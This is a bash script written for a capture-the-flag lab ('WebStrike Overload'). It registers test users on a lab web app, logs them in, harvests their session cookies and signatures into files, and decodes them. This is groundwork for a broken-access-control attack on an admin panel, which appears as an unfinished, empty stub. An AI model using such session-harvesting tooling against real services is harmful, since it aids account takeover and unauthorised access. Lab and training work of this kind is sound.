#!/usr/bin/bash

# Description: Automates the collection of sessionId,session, and session.sig cookie values for newly registered users
# Context: INE CTF WebStrike Overload	

# CWE: Broken Access Control, IDOR, Node.js Express Middleware

# To-Do: createUsers(), checkAdmin()

# Usage: ./sessCollect -u http://10.4.27.116:8080/login 
	# To-Do: -h 
		# --url, -u 
		# --admin-url,	
		# --pass , -P
		# --port, -p
USERS="users.txt"
URL="http://10.4.27.116:8080/login"
URL2="http://10.4.27.116:8080/create"
PASS="test1234"


b64="ids.txt"

function createUsers() {
	while IFS= read -r name; do
		curl -i -s ${URL2} -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d "username=$name&password=${PASS}"
		echo "[+] User $name created..."	
		sleep 1
	done < ${USERS}
}



function collectSessions() {
        while IFS= read -r name; do	
		echo " "
                echo "[+] Collecting session sha-1 hash for user: $name"
                curl -i -s ${URL} -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d "username=$name&password=${PASS}" | head -n 5 | awk '{print $2}' | grep sessionId | cut -d'=' -f2 | cut -d';' -f1 >> sha.txt
                sleep 2

                echo "[+] Collecting b64 sessionId for user: $name"
                curl -i -s ${URL} -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d "username=$name&password=${PASS}" | head -n 5 | awk '{print $2}' | grep -v sessionId | grep -v session.sig | grep session | awk -F'session=|;' '{print $2}' >> ids.txt
                sleep 2

                echo "[+] Collecting session.sig for user: $name"
                curl -i -s ${URL} -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d "username=$name&password=${PASS}" | head -n 5 | awk '{print $2}' | grep session.sig | cut -d'=' -f2 | cut -d';' -f1 >> sigs.txt

                sleep 2

        done < ${USERS}
}


function checkAdmin() {
	# 3 payload positions using files created above
		# /admin-panel endpoint
}

function b64Decode() {
	while IFS= read -r b64string; do
		echo $b64string | base64 -d >> decoded.txt
		sleep 1
	done < ${b64}

}


createUsers
collectSessions
b64Decode
#checkAdmin




